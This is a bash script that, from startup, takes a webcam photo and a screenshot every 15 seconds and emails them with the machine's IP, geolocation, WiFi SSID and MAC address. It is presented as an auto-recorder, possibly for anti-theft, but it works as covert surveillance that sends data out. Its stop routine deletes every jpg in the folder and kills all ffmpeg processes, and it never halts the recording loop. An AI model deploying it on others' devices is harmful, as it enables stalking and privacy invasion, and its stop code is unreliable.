#!/bin/bash

# filename: auto-recorder.sh
# brief: This script takes photos with the webcam every 15 seconds on startup
# description: This script takes photos with the webcam every 15 seconds and sends them by email until the user stops it with auto-recorder.sh stop 
# author: 713koukou-naizaa
# date: 2025-01-21
# usage: Set the script to run on startup, stop it with auto-recorder.sh stop

# FUNCTIONS
get_date() {
    date=$(date +%Y-%m-%d-%H-%M-%S)
    echo $date
}

get_geolocation() {
    location=$(curl -s ipinfo.io | grep -E '"city"|"region"|"country"' | awk -F: '{print $2}' | tr -d '", ')
    echo $location
}

get_ip_address() {
    ip_address=$(curl -s ifconfig.me)
    echo $ip_address
}

get_mac_address() {
    mac_address=$(ip link show | awk '/ether/ {print $2}')
    echo $mac_address
}

get_wifi_ssid() {
    ssid=$(iwgetid -r)
    echo $ssid
}

take_photo() {
    photo="photo-$(date +%Y-%m-%d-%H-%M-%S).jpg"
    ffmpeg -f video4linux2 -i /dev/video0 -frames:v 1 $photo
    echo $photo
}

take_screenshot() {
    screenshot="screenshot-$(date +%Y-%m-%d-%H-%M-%S).jpg"
    flameshot full -p $screenshot
    echo $screenshot
}

send_mail() {
    local mail_body=$1
    local mail_subject=$2
    echo "$mail_body" | mutt -s "$mail_subject" -- $recipient
}

send_mail_with_attachments() {
    local mail_body=$1
    local mail_subject=$2
    local photo=$3
    local screenshot=$4
    echo "$mail_body" | mutt -s "$mail_subject" -a $photo -a $screenshot -- $recipient
}

# VARIABLES
recipient="recipient@provider"
base_mail_subject="[Auto-recorder]"
base_mail_body=$(cat <<EOF

Location: $(get_geolocation)
IP address: $(get_ip_address)
Wifi SSID: $(get_wifi_ssid)
MAC address: $(get_mac_address)
EOF
)


# START

# Check if the user wants to stop the script
if [ "$1" == "stop" ]; then
    # Delete every residual photo and screenshot
    rm *.jpg

    # Send stop email
    send_mail "Auto-recorder stopped.$base_mail_body" "$base_mail_subject - Stopped"

    # Stop the processes started by the script
    pkill -f ffmpeg
    pkill -f flameshot

    # Exit
    exit 0
else
    # Send start email
    send_mail "Auto-recorder started.$base_mail_body" "$base_mail_subject - Started"
fi

# Main loop
while true; do
    # Wait for 15 seconds
    sleep 15

    # Take a photo
    photo=$(take_photo)

    # Take a screenshot
    screenshot=$(take_screenshot)

    # Send photo and screenshot mail
    send_mail_with_attachments "Auto-recorder took a photo and a screenshot.$base_mail_body" "$base_mail_subject - Photo and Screenshot" $photo $screenshot

    # Delete the photo and screenshot
    rm $photo
    rm $screenshot
done